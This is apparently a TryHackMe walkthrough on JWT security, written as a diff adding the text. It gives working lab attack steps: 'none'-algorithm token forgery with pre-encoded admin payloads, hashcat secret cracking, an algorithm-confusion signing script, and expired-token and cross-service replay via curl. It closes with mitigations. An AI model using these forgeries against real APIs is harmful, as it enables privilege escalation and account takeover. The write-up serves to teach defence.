@@ -1,0 +1,205 @@
+JWT Security - TryHackMe Walkthrough. The images for this tutorial was not copied over.
+
+🔗 TryHackMe Room: https://tryhackme.com/r/room/jwtsecurity
+
+Introduction
+
+Traditional cookie-based authentication is not ideal for API security as it is not agnostic across different interfaces. Token-based session management, specifically using JSON Web Tokens (JWTs), provides a more scalable and secure authentication mechanism.
+
+Client-Side Token-Based Session Management
+	•	Tokens are stored in the browser’s local storage.
+	•	JWTs are included in API requests using the Authorization: Bearer header.
+*************
+
+1️⃣ Exploiting an API Using JWTs
+
+To interact with an API using JWT-based authentication, we can use tools like Postman, Swagger, or cURL.
+
+Authenticate and Obtain JWT
+
+Use the following cURL request to authenticate and obtain a JWT:
+
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "passwordX" }' http://10.10.227.100/api/v1.0/exampleX
+
+This request returns a JWT token, which is required for subsequent API calls.
+
+Verify User Role Using JWT
+
+Replace [JWT token] with the token obtained from the authentication request and specify a user role (user or admin):
+curl -H 'Authorization: Bearer [JWT token]' http://10.10.227.100/api/v1.0/example2?username=Y
+
+🔹 Y can be either user or admin, depending on your permissions.
+
+***************
+2️⃣ Sensitive Information Disclosure in JWTs
+
+JWTs are commonly sent in HTTP requests using the following header:
+Authorization: Bearer [JWT Token]
+
+A JWT consists of three Base64Url-encoded parts:
+Header.Payload.Signature
+
+Header: Contains metadata, including the signing algorithm.
+Payload: Contains user-specific claims (e.g., username, roles, expiration time).
+Signature: Ensures integrity using HMAC-SHA256 (HS256) or RSA (RS256)
+
+Signature Algorithms & Security Concerns
+None Algorithm (none): No signature validation (highly insecure 🚨).
+Symmetric Signing (HS256): Requires a secret key.
+Asymmetric Signing (RS256): Uses public/private key pairs.
+Encrypted JWTs (JWE): Provide additional security.
+
+🔹 Decode JWTs Online:
+Use jwt.io to decode and analyze JWTs.
+
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.10.227.100/api/v1.0/example1
+
+Decode JWT:https://jwt.io/
+
+
+3️⃣ Signature Validation Mistakes
+
+One common JWT security flaw is improper signature validation, allowing an attacker to modify the token.
+
+Exploiting Weak Signature Verification
+
+Modify the JWT payload to escalate privileges (e.g., changing admin: 0 to admin: 1):
+
+ Bypassing Signature Validation
+
+Some APIs accept the “none” algorithm, meaning no secret key is needed for verification. Modify the JWT header to:
+{
+  "typ": "JWT",
+  "alg": "None"
+}
+And
+{
+  "username": "user",
+  "admin": 1
+} 
+
+Downgrading to None algorithm signature
+
+🔹 Use CyberChef to modify and re-encode JWTs.
+{
+  "typ": "JWT",
+  "alg": "None"
+}
+ to base64 
+eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0
+
+{
+  "username": "user",
+  "admin": 1
+}
+To base64
+eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0
+
+
+The Fix
+If multiple signature algorithms should be supported, the supported algorithms should be supplied to the decode function as an array list, as shown below:
+payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])
+username = payload['username']
+flag = self.db_lookup(username, "flag")
+
+Do Not do this:
+header = jwt.get_unverified_header(token)
+signature_algorithm = header['alg']
+payload = jwt.decode(token, self.secret, algorithms=signature_algorithm)
+
+Weak Symmetric Secret
+1. Save the JWT to a text file called jwt.txt.
+2. Download a common JWT secret list. For this room, you can use wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list to download such a list.
+3. Use Hashcat to crack the secret using hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
+
+Signature Algorithm Confusion
+In  /usr/lib/python3/dist-packages/jwt/algorithms.py, modify by commenting the if statement of is_pem_format(key) or is_ssh_key(key)
+
+Create python script to get access token value: ******
+import jwt
+
+public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip"
+
+payload = {
+	'username' : 'user’,
+	'admin' : 1
+}
+
+access_token = jwt.encode(payload, public_key, algorithm="HS256")
+
+print(access_token)
+
+*****
+
+4️⃣ JWT Lifetimes and Expiration Attacks
+
+JWTs should have an expiration time (exp) to prevent misuse. However, some applications fail to properly validate token expiry, allowing attackers to reuse old tokens.
+
+Example of an Expired JWT
+
+{
+  "sub": "user",
+  "exp": 1516239022
+}
+
+	•	The exp field specifies when the token expires (Unix timestamp).
+	•	If the API does not verify the exp claim, an attacker can reuse expired tokens indefinitely.
+
+curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.ko7EQiATQQzrQPwRO8ZTY37pQWGLPZWEvdWH0tVDNPU' http://10.10.109.159/api/v1.0/example6?username=admin
+
+
+5️⃣ Cross-Service Relay Attacks
+
+JWTs are stateless and can be used across multiple services. If an attacker steals a valid JWT, they can use it on different services that accept the same authentication mechanism.
+
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQSJ9.9pTV2-bB5u5erMdzUrYk7Xogv6BsK8O2NSmaS6FfiI8' http://10.10.109.159/api/v1.0/example7_appA?username=admin
+
+🔹 Best Practice:
+	•	Use audience (aud) and issuer (iss) validation to ensure JWTs are not misused across different services.
+
+Practical Exploitation Example
+	1.	Obtain a JWT via Authentication
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appA" }' http://10.10.227.100/api/v1.0/example7
+
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appB” }' http://10.10.227.100/api/v1.0/example7
+
+🔹 Response Example:
+For user verification, the following cURL request can be made:
+curl -H 'Authorization: Bearer [JWT token]' http://10.10.109.159/api/v1.0/example2?username=Y
+
+
+root@ip-10-10-222-85:~# curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appA" }' http://10.10.109.159/api/v1.0/example7
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4"
+}
+root@ip-10-10-222-85:~# curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appB" }' http://10.10.109.159/api/v1.0/example7
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o"
+}
+
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' http://10.10.109.159/api/v1.0/example7_appA?username=admin
+
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.10.109.159/api/v1.0/example7_appB?username=admin
+
+
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.10.109.159/api/v1.0/example7_appA?username=admin
+
+
+
+Mitigations & Best Practices
+
+✅ Always Validate JWT Signatures: Reject tokens using "alg": "None".
+✅ Use Strong Secrets for HS256: Weak secrets can be brute-forced.
+✅ Prefer Asymmetric Signing (RS256): Public/private key pairs improve security.
+✅ Enforce Token Expiration (exp): Prevent reuse of expired tokens.
+✅ Use aud and iss Claims: Restrict JWT usage to the intended service.
+✅ Implement Token Revocation: JWTs cannot be revoked by default. Use short-lived tokens and refresh mechanisms.
+✅ Secure Transmission: Always send JWTs over HTTPS to prevent interception.
+
+Conclusion
+
+This walkthrough demonstrates how JWT authentication works, common security pitfalls, and how attackers can exploit weak JWT implementations. Understanding these flaws helps in hardening APIs against JWT-based attacks.
+
+🔹 Next Steps:
+Spoofing Attack
+https://tryhackme.com/r/room/hammer 🚀
